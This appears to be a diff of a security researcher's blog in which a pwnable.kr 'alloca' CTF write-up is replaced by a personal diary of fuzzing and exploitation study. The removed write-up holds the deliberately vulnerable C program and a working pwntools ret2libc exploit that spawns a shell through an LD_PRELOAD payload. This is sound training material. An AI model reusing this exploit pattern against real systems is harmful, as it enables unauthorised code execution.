@@ -3,23 +3,20 @@
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
   
-  <title>pwnable.kr -- alloca | o0xmuhe&#39;s blog</title>
+  <title>闲言碎语 | o0xmuhe&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="0x00:好久没玩了…去年十月以后就没玩过了TAT 这几天把peach的坑，winafl的坑填了下，就来搞下pwn。">
-<meta name="keywords" content="wargame">
+  <meta name="description" content="那就祝大家鸡年大吉吧">
+<meta name="keywords" content="life">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwnable.kr -- alloca">
-<meta property="og:url" content="http://o0xmuhe.me/2016/08/14/pwnable-kr-alloca/index.html">
+<meta property="og:title" content="闲言碎语">
+<meta property="og:url" content="http://o0xmuhe.me/2017/01/28/闲言碎语/index.html">
 <meta property="og:site_name" content="o0xmuhe&#39;s blog">
-<meta property="og:description" content="0x00:好久没玩了…去年十月以后就没玩过了TAT 这几天把peach的坑，winafl的坑填了下，就来搞下pwn。">
+<meta property="og:description" content="那就祝大家鸡年大吉吧">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://blogimg-10065924.cos.myqcloud.com/pwnable.kr_alloca.png">
-<meta property="og:image" content="http://blogimg-10065924.cos.myqcloud.com/pwnable.kr_alloca1.png">
-<meta property="og:updated_time" content="2016-10-06T07:52:54.000Z">
+<meta property="og:updated_time" content="2018-11-26T11:01:36.500Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwnable.kr -- alloca">
-<meta name="twitter:description" content="0x00:好久没玩了…去年十月以后就没玩过了TAT 这几天把peach的坑，winafl的坑填了下，就来搞下pwn。">
-<meta name="twitter:image" content="http://blogimg-10065924.cos.myqcloud.com/pwnable.kr_alloca.png">
+<meta name="twitter:title" content="闲言碎语">
+<meta name="twitter:description" content="那就祝大家鸡年大吉吧">
   
     <link rel="alternative" href="/atom.xml" title="o0xmuhe&#39;s blog" type="application/atom+xml">
   
@@ -287,11 +284,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-pwnable-kr-alloca" class="article article-type-post" itemscope="" itemprop="blogPost">
+      <div class="body-wrap"><article id="post-闲言碎语" class="article article-type-post" itemscope="" itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2016/08/14/pwnable-kr-alloca/" class="article-date">
-      <time datetime="2016-08-14T07:47:42.000Z" itemprop="datePublished">2016-08-14</time>
+      <a href="/2017/01/28/闲言碎语/" class="article-date">
+      <time datetime="2017-01-28T15:03:15.000Z" itemprop="datePublished">2017-01-28</time>
 </a>
     </div>
   
@@ -304,7 +301,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      pwnable.kr -- alloca
+      闲言碎语
     </h1>
   
 
@@ -315,7 +312,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wargame/">wargame</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/life/">life</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -325,13 +322,61 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>好久没玩了…去年十月以后就没玩过了TAT 这几天把peach的坑，winafl的坑填了下，就来搞下pwn。</p>
-<a id="more"></a>
-<h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01:"></a>0x01:</h4><p>这个程序是给了源码的<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear_newlines</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        c = getchar();</span><br><span class="line">    &#125;<span class="keyword">while</span> (c != <span class="string">'\n'</span> &amp;&amp; c != EOF);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> g_canary;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_canary</span><span class="params">(<span class="keyword">int</span> canary)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result = canary ^ g_canary;</span><br><span class="line">    <span class="keyword">int</span> canary_after = canary;</span><br><span class="line">    <span class="keyword">int</span> canary_before = g_canary;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"canary before using buffer : %d\n"</span>, canary_before);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"canary after using buffer : %d\n\n"</span>, canary_after);</span><br><span class="line">    <span class="keyword">if</span>(result != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"what the f...??? how did you fucked this buffer????\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"I told you so. its trivially easy to prevent BOF :)\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"therefore as you can see, it is easy to make secure software\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> size;</span><br><span class="line"><span class="keyword">char</span>* buffer;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- BOF(buffer overflow) is very easy to prevent. here is how to.\n\n"</span>);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"   1. allocate the buffer size only as you need it\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"   2. know your buffer size and limit the input length\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- simple right?. let me show you.\n\n"</span>);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- whats the maximum length of your buffer?(byte) : "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;size);</span><br><span class="line">    clear_newlines();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"- give me your random canary number to prove there is no BOF : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;g_canary);</span><br><span class="line">        clear_newlines();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- ok lets allocate a buffer of length %d\n\n"</span>, size);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    buffer = alloca( size + <span class="number">4</span> );    <span class="comment">// 4 is for canary</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- now, lets put canary at the end of the buffer and get your data\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- don't worry! fgets() securely limits your input after %d bytes :)\n"</span>, size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- if canary is not changed, we can prove there is no BOF :)\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"$ "</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buffer+size, &amp;g_canary, <span class="number">4</span>);    <span class="comment">// canary will detect overflow.</span></span><br><span class="line">    fgets(buffer, size, <span class="built_in">stdin</span>);        <span class="comment">// there is no way you can exploit this.</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- now lets check canary to see if there was overflow\n\n"</span>);</span><br><span class="line">    check_canary( *((<span class="keyword">int</span>*)(buffer+size)) );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>主要还是需要突破他的防护，拿到shell。<br>看下bin文件开了什么保护：<br><img src="http://blogimg-10065924.cos.myqcloud.com/pwnable.kr_alloca.png" alt=""><br>调试发现，check_canary()函数返回的时候，如果恰当的设置g_canary的值，就可以控制返回地值。<br><img src="http://blogimg-10065924.cos.myqcloud.com/pwnable.kr_alloca1.png" alt=""><br>然后我就卡在这里了…开启了NX，只能ROP的思路搞，但是ROP链又不知道哪里放置。</p>
-<h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02:"></a>0x02:</h4><p>后来参考了别人的做法，才发现这是个本地利用…直接按照以前玩overthewire学来的套路就可以：sc放在环境变量离，然后确定地址，直接改返回地值过去就可以了。<br>不过首先要利用ulimit -s unlimited去固定下libc的加载地址，然后才可以确定system()和/bin/sh地址。</p>
-<p>附上我本地调试的时候的exp，环境不同，所以地址可能不同。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">off_system  = <span class="number">0x0003d3e0</span>    <span class="comment"># objdump -d /lib/i386-linux-gnu/libc.so.6 | grep system</span></span><br><span class="line">off_shell   = <span class="number">0x0015ea69</span>    <span class="comment"># grep -oba /bin/sh /lib/i386-linux-gnu/libc.so.6</span></span><br><span class="line">adr_libc    = <span class="number">0x40047000</span>    <span class="comment"># ldd alloca</span></span><br><span class="line">adr_payload = <span class="number">0x40025857</span>    <span class="comment"># searchmem "AAAA"</span></span><br><span class="line">payload     =   p32(adr_libc + off_system)</span><br><span class="line">payload     +=  p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload     +=  p32(adr_libc + off_shell)</span><br><span class="line"><span class="comment">#test = "AAAABBBBCCCC"</span></span><br><span class="line"><span class="comment">#p = process('./alloca', env = &#123;'LD_PRELOAD': test&#125;)</span></span><br><span class="line">p = process(<span class="string">'./alloca'</span>, env = &#123;<span class="string">'LD_PRELOAD'</span>: payload&#125;)</span><br><span class="line"><span class="comment">#raw_input("$$")</span></span><br><span class="line">p.sendline(str(<span class="number">-92</span>))</span><br><span class="line">p.sendline(str((adr_payload + <span class="number">4</span>) ^ <span class="number">0x08048250</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x40025857 ^ 0x08048250 --&gt; 0x4806da07</span></span><br><span class="line"><span class="string">Cannot access memory at address 0x4806da03</span></span><br><span class="line"><span class="string">0x40025857 + 4</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></p>
-<h4 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03:参考链接"></a>0x03:参考链接</h4><p><a href="http://0byjwzsf.me/2016/08/08/pwnable-rookiss-alloca/#more" target="_blank" rel="noopener">0byjwzsf</a></p>
+        <pre><code>那就祝大家鸡年大吉吧
+</code></pre><a id="more"></a>
+<h4 id="2017-01-28"><a href="#2017-01-28" class="headerlink" title="2017-01-28"></a>2017-01-28</h4><p>大年初一还在写代码，把以前挖的坑填起来，一直想做的自动化的框架终于有点样子了，先做的能跑起来，然后再做一些优化工作把。想着是像<code>msf</code>那样的，几个功能分成几个模块去做，模块之间独立，然后<code>paylod</code>那些可以随意调用；今天只把<code>exploit</code>部分写了个开头，感觉总想推翻重写…这是病，先做完了再说重构的事情好了 QAQ 。</p>
+<p>前几天入坑了<code>Windows Kernel Exploit</code>相关，看到了关于内核内存分配相关的资料的时候，感觉好熟悉，一下想起了之前看到<code>linux glibc</code>堆管理相关的资料了。有种很熟悉的感觉吧，怎么说呢，感觉再看到<code>windows kernel</code>内存管理部分的时候就很容易可以理解这些结构是怎么工作的，上手还是快，不过还是想写写代码调试看看，毕竟<code>纸上得来终觉浅</code>。</p>
+<p>说到填坑，感觉好多啊，之前<code>Android Sec</code>相关；<code>LLVM</code>的研究也是处在挂起状态，之前是结合着代码混淆技术去学习的，自己写写pass之类的，还有就是看看<code>OLLVM</code>这个项目；<code>符号执行</code>技术的学习算是迈入正轨吧，<code>Paper</code>也很多。还有就是<code>YouTube</code>上好多不错的这些相关的视频啊 2333333</p>
+<p>慢慢来吧，感觉都很有意思，而且越往后研究越有意思呀~</p>
+<h4 id="2017-01-29"><a href="#2017-01-29" class="headerlink" title="2017-01-29"></a>2017-01-29</h4><p>框架<code>exploit</code>部分完成啦 -。- 哦豁<br>看<code>Android</code>相关，看到<code>Dalvk</code>虚拟机部分的时候，看到了关于<code>Zygote</code>，就是虚拟机实例孵化器…然而这个单词的意思也是很有趣啊 啊哈哈哈哈哈哈哈，形象生动 233333333333333</p>
+<h4 id="2017-01-30"><a href="#2017-01-30" class="headerlink" title="2017-01-30"></a>2017-01-30</h4><p>纠结到底开不开源一些东西 :(</p>
+<h4 id="2017-02-04"><a href="#2017-02-04" class="headerlink" title="2017-02-04"></a>2017-02-04</h4><p>浪完了回来开工了 23333<br>想明白了一些事，精力有限，贪多嚼不烂；其次就是关于重视基本功，一味地追求上层建筑是没有意义的，早晚要崩塌。那学习技术来说，想做的很多，但是你能够做好其中一两件已经很不错了，还有就是操作系统这个东西…不去把那些lab刷了感觉还是白学，知行合一吧算是。</p>
+<h4 id="2017-02-07"><a href="#2017-02-07" class="headerlink" title="2017-02-07"></a>2017-02-07</h4><p>mdzz啊…编译linux内核然后升级个linux，然后虚拟机就炸了硬盘没挂上…bug<br>尝试一下添加系统调用、驱动的方式来体验一下<code>linux kernel exploit</code> 23333333333</p>
+<h4 id="2017-02-11"><a href="#2017-02-11" class="headerlink" title="2017-02-11"></a>2017-02-11</h4><p>把自己的PwnableLog这个repo整合进了一些收集的不错的脚本，稍作改动就可以玩了。啊 winafl对于GUI程序真是尴尬，发送窗口关闭消息或者循环进程检测并杀进程的思路效果都不理想…看来只有二次插桩可以用。</p>
+<h4 id="2017-02-17"><a href="#2017-02-17" class="headerlink" title="2017-02-17"></a>2017-02-17</h4><p>框架防御模块基本做起来了…想着先出成品再修bug/优化工作。当初瞎立flag，巧了又有点拖延症，哦豁，have fun咯。</p>
+<h4 id="2017-02-28"><a href="#2017-02-28" class="headerlink" title="2017-02-28"></a>2017-02-28</h4><p>挺尴尬很多东西以前没做详细的记录，只有零碎的记录和脚本…总结起来就很蛋疼。<br>最近还是挺开心啊，有了铠甲也有了软肋，感觉多了一个努力的理由咯。</p>
+<h4 id="2017-03-01"><a href="#2017-03-01" class="headerlink" title="2017-03-01"></a>2017-03-01</h4><p>一个有情怀的二进制狗。</p>
+<h4 id="2017-03-06"><a href="#2017-03-06" class="headerlink" title="2017-03-06"></a>2017-03-06</h4><p>这是假的，那是假的，好像没什么真的了。</p>
+<h4 id="2017-03-10"><a href="#2017-03-10" class="headerlink" title="2017-03-10"></a>2017-03-10</h4><p>最近开始看linux kernel相关，底层真的太有趣了~<br>linus insides这个gitbook不错，从boot开始讲，结合着看就很不错，再对应着源码，很爽。</p>
+<h4 id="2017-03-13"><a href="#2017-03-13" class="headerlink" title="2017-03-13"></a>2017-03-13</h4><p>肝了两天NJCTF…还是感觉太菜了 QAQ 低分题目做的慢 高分玩不动…<br>挺可惜的reverse400，符号执行脚本都写好了，跑了几次，posixdump的是空值，怕是脚本又写的有问题，路径找到了，就是dump不对，尴尬。<br>pwnable，简单的一些细节处理的不好，很伤，平时的积累啊，多收集libc，多动手搞事情 23333<br>SROP开眼了，又是论文pwn，害怕…不过joker那个exp真的太黑客了，思路666<br>好好学习把~ 比赛真的挺有意思的 XD</p>
+<h4 id="2017-03-22"><a href="#2017-03-22" class="headerlink" title="2017-03-22"></a>2017-03-22</h4><p>面试这几次，倍感所学知识面的狭窄，了解的很有限，而且以前掌握的一些东西没有再去看就很容易忘记一些细节(还好还有笔记…)<br>感觉一直在被问移动安全…学习学习。<br>经历一些比赛之后，感觉还有很多漏洞利用的trick…调试的trick，比如获取gs:0x10的值，都有待积累。</p>
+<h4 id="2017-03-23"><a href="#2017-03-23" class="headerlink" title="2017-03-23"></a>2017-03-23</h4><p>好多不顺利- -。<br>想要的很简单，可是得到却那么难。</p>
+<h4 id="2017-03-27"><a href="#2017-03-27" class="headerlink" title="2017-03-27"></a>2017-03-27</h4><p>重头再来，一切还要继续，我不还是要接着看书学习写代码么。</p>
+<h4 id="2017-03-29"><a href="#2017-03-29" class="headerlink" title="2017-03-29"></a>2017-03-29</h4><p>调试分析CVE-2017-7269,发现用capstone还原shellcode挺好用的…虽然还原出来的sc并不好懂…可能是姿势有问题?汇编指令用的很奇怪…还有就是快速定位漏洞点，我想打个CC然后just in time debugger进去栈回溯看，但是效果不理想，啊啊啊 测试别的方法好了。</p>
+<h4 id="2017-04-01"><a href="#2017-04-01" class="headerlink" title="2017-04-01"></a>2017-04-01</h4><p>将生活带给你的柠檬版的酸楚，酿成犹如柠檬汽水般的甘甜。<br>已经如此了，再坏也坏不到哪里去了。<br>没有什么后路，也就无所畏惧，大步向前。</p>
+<h4 id="2017-05-05"><a href="#2017-05-05" class="headerlink" title="2017-05-05"></a>2017-05-05</h4><p>有时候需要反思以下自己的讲话的方式。可能是这几年接触的最多的是技术相关的朋友，圈子很小，所以大家交流的方式都是那么直接，也很直白，比如说到xxx，就会直接讲，xxx很简单的，你只要看了xxxxx就可以搞定xxxxx然后最后就可以完成xxx。</p>
+<p>其实你反思以下，在圈外人看来呢？可能很多人看来是：mdzz 我不懂这些，你还说的有劲。</p>
+<p>还有就是方式把，不可能一直生活在这个小圈子，总要接触很多人，所以不要总是以技术宅的思维去交流做事，有时候挺伤人咯-。-  </p>
+<p>别人为什么不问你问题，因为你总说：这个太简单了那个太简单了。</p>
+<p>层次问题…有些问题在大佬看来很简单，在我看来就很困难…相互理解下就好了  233333</p>
+<p>好好学习啦，多看书，修身养性，热爱生活。</p>
+<h4 id="2017-05-23"><a href="#2017-05-23" class="headerlink" title="2017-05-23"></a>2017-05-23</h4><p>铁三西南赛区打的挺不错，开心。</p>
+<p>近期开始学习编译原理，三大浪漫之一 23333</p>
+<p>人无信不足以立，对于这两天发生的事情的感受吧，又不能发火，烦。</p>
+<p>1adac很好用，爽，这钱花的值。</p>
+<p>还有嘛…有些时候付出不一定要回报，况且有些事情是习惯了-。-</p>
+<h4 id="2017-05-30"><a href="#2017-05-30" class="headerlink" title="2017-05-30"></a>2017-05-30</h4><p>孤独感。</p>
+<h4 id="2017-06-29"><a href="#2017-06-29" class="headerlink" title="2017-06-29"></a>2017-06-29</h4><p>自说自话的**只不过是给别人平添烦恼罢了。</p>
+<h4 id="2017-07-04"><a href="#2017-07-04" class="headerlink" title="2017-07-04"></a>2017-07-04</h4><p>断断续续看完了 CVE-2016-0728的分析，也搭建了环境分析。Linux kernel的UAF挺有意思。<br>还在写使用了NFA构造的词法分析器…cpp拙计 感觉c可以做，但是后期优化出DFA的时候就拙计了。</p>
+<h4 id="2017-07-30"><a href="#2017-07-30" class="headerlink" title="2017-07-30"></a>2017-07-30</h4><p>实习。忙着工作的事，挺开心的，做喜欢的事，虽然感觉挺难的，不过有挑战性才更有意思。<br>blog感觉很久不会再去更新了 2333333</p>
+<p>昨晚和朋友聊天，被说：比起喜欢，我觉得你更需要人陪。</p>
+<p>假的假的。</p>
+<h4 id="2017-08-20"><a href="#2017-08-20" class="headerlink" title="2017-08-20"></a>2017-08-20</h4><p>遇到两个不能复现的crash了，很心累。<br>准备重写fuzz框架重新搞事了。</p>
+<h4 id="2017-08-24"><a href="#2017-08-24" class="headerlink" title="2017-08-24"></a>2017-08-24</h4><p>解决了之前的bug，又遇到了新的…</p>
+<h4 id="2017-09-26"><a href="#2017-09-26" class="headerlink" title="2017-09-26"></a>2017-09-26</h4><p>再接再厉</p>
+<h4 id="2017-10-27"><a href="#2017-10-27" class="headerlink" title="2017-10-27"></a>2017-10-27</h4><p>愿此间 山有木兮卿有意<br>昨夜星辰恰似你</p>
+<h4 id="2017-12-30"><a href="#2017-12-30" class="headerlink" title="2017-12-30"></a>2017-12-30</h4><p>2017就快过完了，我还在搞着adobe reader。花式空指针，fuzzer还在完善，各种各样的问题，觉得难又觉得不难。<br>思路都很好玩，只是自身能力有限，啃不动。需要时间去积累。</p>
+<p>而且就在昨天，发现自己之前漏掉了一个攻击点…简直血亏。 叹息…</p>
+<h4 id="2018-2-14"><a href="#2018-2-14" class="headerlink" title="2018-2-14"></a>2018-2-14</h4><p>过不过节感觉没啥区别啊-。-<br>《自制编译器》真的是一本不可多得的好书。终于看到IR生成部分了，先把公开课关于中间代码生成的部分搞定了，再去看这本书这部分的内容，然后再去看它的代码。</p>
+<p>有几天没去搞工作上的事了，只是看看paper和slide，感觉好咸鱼啊。 :(</p>
+<p>最后，高老师节日快乐-。-</p>
+<h4 id="2018-2-28"><a href="#2018-2-28" class="headerlink" title="2018-2-28"></a>2018-2-28</h4><p>快要去学校了。<br>工作有点进展了，还在看grinder源码，要改造，long way to go</p>
+<p>编译原理学习中。</p>
+<h4 id="2018-4-29"><a href="#2018-4-29" class="headerlink" title="2018-4-29"></a>2018-4-29</h4><p>真的想吐槽。<br>最近比赛什么玩意。</p>
+<h4 id="2018-6-9"><a href="#2018-6-9" class="headerlink" title="2018-6-9"></a>2018-6-9</h4><p>阅读paper，阅读源码，学习别人的思路。<br>好好看书，想拿antlr4搞大事。</p>
+<h4 id="2018-8-13"><a href="#2018-8-13" class="headerlink" title="2018-8-13"></a>2018-8-13</h4><p>本来工作的第一个月开开心心，学东西也看心，爽的一批。<br>但是八月份飞扬一开始，就TM负能量爆棚。 辣鸡飞扬，劝退系列，洗脑特么失败了。<br>看看某司、某司、某司…哪家像你们这么搞人？<br>耽误正常工作好吧，浪费时间好吧。</p>
+<h4 id="2018-11-10"><a href="#2018-11-10" class="headerlink" title="2018-11-10"></a>2018-11-10</h4><p>关于code coverage，对格式类fuzz很有意义，但是语法、脚本引擎这种靠逻辑的东西，意义似乎没那么大。<br>工作的蛮开心，压力动力并存，希望自己能扛过去，完成蜕变。</p>
+<h4 id="2018-11-26"><a href="#2018-11-26" class="headerlink" title="2018-11-26"></a>2018-11-26</h4><p>天府杯结束，继续努力。<br>给自己开了两个大坑，一个是关于文件格式，一个关于代码生成，随便一个都要做好久…更别提还有很多漏洞需要分析，短期内应该不会提交漏洞了。</p>
 
       
     </div>
@@ -340,13 +385,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2016/08/14/pwnable-kr-alloca/">pwnable.kr -- alloca</a></p>
+        <p><span>本文标题:</span><a href="/2017/01/28/闲言碎语/">闲言碎语</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 muhe 的个人博客">muhe</a></p>
-        <p><span>发布时间:</span>2016年08月14日 - 15时47分</p>
-        <p><span>最后更新:</span>2016年10月06日 - 15时52分</p>
+        <p><span>发布时间:</span>2017年01月28日 - 23时03分</p>
+        <p><span>最后更新:</span>2018年11月26日 - 19时01分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2016/08/14/pwnable-kr-alloca/" title="pwnable.kr -- alloca">http://o0xmuhe.me/2016/08/14/pwnable-kr-alloca/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://o0xmuhe.me/2016/08/14/pwnable-kr-alloca/　　作者: muhe" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/01/28/闲言碎语/" title="闲言碎语">http://o0xmuhe.me/2017/01/28/闲言碎语/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://o0xmuhe.me/2017/01/28/闲言碎语/　　作者: muhe" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -359,18 +404,18 @@
 
 <nav id="article-nav">
   
-    <a href="/2016/08/26/初试winafl/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2017/01/30/Linux socket进程间通信及应用/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption"><</strong>
       <div class="article-nav-title">
         
-          初试winafl
+          Linux socket进程间通信及应用
         
       </div>
     </a>
   
   
-    <a href="/2016/08/01/简单的尝试angr/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">简单的尝试angr</div>
+    <a href="/2017/01/22/Have-fun-with-Blind-ROP/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Have fun with Blind ROP</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -381,7 +426,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00"><span class="toc-number">1.</span> <span class="toc-text">0x00:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01"><span class="toc-number">2.</span> <span class="toc-text">0x01:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02"><span class="toc-number">3.</span> <span class="toc-text">0x02:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-参考链接"><span class="toc-number">4.</span> <span class="toc-text">0x03:参考链接</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-01-28"><span class="toc-number">1.</span> <span class="toc-text">2017-01-28</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-01-29"><span class="toc-number">2.</span> <span class="toc-text">2017-01-29</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-01-30"><span class="toc-number">3.</span> <span class="toc-text">2017-01-30</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-02-04"><span class="toc-number">4.</span> <span class="toc-text">2017-02-04</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-02-07"><span class="toc-number">5.</span> <span class="toc-text">2017-02-07</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-02-11"><span class="toc-number">6.</span> <span class="toc-text">2017-02-11</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-02-17"><span class="toc-number">7.</span> <span class="toc-text">2017-02-17</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-02-28"><span class="toc-number">8.</span> <span class="toc-text">2017-02-28</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-03-01"><span class="toc-number">9.</span> <span class="toc-text">2017-03-01</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-03-06"><span class="toc-number">10.</span> <span class="toc-text">2017-03-06</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-03-10"><span class="toc-number">11.</span> <span class="toc-text">2017-03-10</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-03-13"><span class="toc-number">12.</span> <span class="toc-text">2017-03-13</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-03-22"><span class="toc-number">13.</span> <span class="toc-text">2017-03-22</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-03-23"><span class="toc-number">14.</span> <span class="toc-text">2017-03-23</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-03-27"><span class="toc-number">15.</span> <span class="toc-text">2017-03-27</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-03-29"><span class="toc-number">16.</span> <span class="toc-text">2017-03-29</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-04-01"><span class="toc-number">17.</span> <span class="toc-text">2017-04-01</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-05-05"><span class="toc-number">18.</span> <span class="toc-text">2017-05-05</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-05-23"><span class="toc-number">19.</span> <span class="toc-text">2017-05-23</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2017-05-30"><span class="toc-number">20.</span> <span 